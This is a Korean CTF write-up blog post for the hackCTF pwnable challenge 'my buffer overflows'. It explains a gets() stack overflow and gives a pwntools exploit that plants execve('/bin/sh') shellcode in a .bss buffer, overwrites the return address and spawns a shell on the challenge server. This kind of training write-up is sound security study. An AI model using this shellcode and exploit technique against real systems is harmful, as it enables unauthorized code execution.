---
layout: post
title:  "[hackCTF]내 버퍼가 흘러넘친다!!"
date:   2020-02-11
---

hackCTF pwnable 네번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-14h]

  setvbuf(stdout, 0, 2, 0);
  printf("Name : ");
  read(0, &name, 0x32u);
  printf("input : ");
  gets(&s);
  return 0;
}
```
<br>

정리해보자.<br><br>

***

|   ret   |          |
|:-------:|:--------:|
|   sfp   |  (4byte) |
|   ebp   | esp+0x14 |
|   ...   |          |
| s (esp) |          |

***

목표 : name에 쉘코드 작성 + ret을 name의 주소로 덮기<br>
취약점 : gets(&s)<br><br>
이번에는 read와 gets를 통해 입력 받을 수 있다. read를 통해 name에 쉘코드를 작성하고 gets를 통해 main 함수의 에필로그 과정에서 ret 대신 name의 쉘코드를 실행시키자<br><br><br>
+) name의 주소는 다음과 같이 .bss영역에 위치한다. 초기값이 없는 전역변수인 모양<br>
![0401](https://drive.google.com/uc?id=14EaC2vWFLHK-FQc2rLPv8xVBi1ZY0H7m)


## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3003)

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

payload2 = "A"*0x18+p32(0x0804A060)

p.recvuntil("Name : ")

p.send(payload)

p.recvuntil("input : ")

p.sendline(payload2)

p.interactive()
```
## 결과  
![0402](https://drive.google.com/uc?id=19pKWvGck62pXej_Gd1MQ-I4VVeLBke5C)
